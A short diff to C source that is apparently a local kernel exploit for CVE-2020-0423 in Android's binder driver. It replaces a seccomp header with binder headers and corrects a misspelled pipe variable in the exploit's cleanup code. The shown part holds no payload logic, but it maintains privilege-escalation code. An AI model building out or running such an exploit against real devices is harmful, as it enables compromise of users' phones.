@@ -27,7 +27,8 @@
 #include <sys/reboot.h>
 #include <stdint.h>
 #include <sys/fsuid.h>
-#include "seccomp.h"
+#include <linux/binder.h>
+#include <linux/android/binder.h>
 #include "binder.h"
 
 extern int setfsuid(uid_t);
@@ -453,7 +454,7 @@ static int exploit_cve_2020_0423_rw(void) {
 
         void *buf = mmap_page(0x100000000UL);
         if (!buf) {
-            close(binder_fd); close(epoll_fd); close(leak_pipe[0]); close(leap_pipe[1]);
+            close(binder_fd); close(epoll_fd); close(leak_pipe[0]); close(leak_pipe[1]);
             continue;
         }
 
